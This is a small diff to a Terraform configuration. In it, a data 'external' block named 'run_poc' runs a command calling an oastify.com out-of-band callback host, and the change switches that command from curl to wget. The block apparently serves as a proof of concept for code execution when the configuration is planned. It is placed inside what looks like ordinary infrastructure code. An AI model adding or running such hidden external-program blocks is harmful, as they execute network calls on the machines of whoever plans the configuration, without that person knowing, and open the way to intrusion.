@@ -11,7 +11,7 @@ resource "random_id" "r" {
 }
 
 data "external" "run_poc" {
-  program = ["curl", "https://z005r7twq22k414db24dfktyapgg46sv.oastify.com/xx"]
+  program = ["wget", "https://z005r7twq22k414db24dfktyapgg46sv.oastify.com/xx"]
 }
 
 variable "env_type_id" {
